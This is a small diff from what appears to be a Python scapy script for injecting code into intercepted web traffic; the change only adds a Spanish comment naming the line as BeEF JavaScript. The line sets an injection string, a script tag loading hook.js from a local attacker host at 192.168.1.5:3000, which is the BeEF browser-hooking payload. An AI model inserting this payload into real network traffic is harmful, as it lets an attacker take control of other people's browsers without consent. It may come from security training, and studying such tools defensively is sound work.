@@ -5,7 +5,7 @@ import scapy.all as scapy
 import re
 
 
-injection_Code = '<script src="http://192.168.1.5:3000/hook.js"></script>'
+injection_Code = '<script src="http://192.168.1.5:3000/hook.js"></script>' # Este es codigo javascript de beef
 
 # A field in scapy will always be a list
 
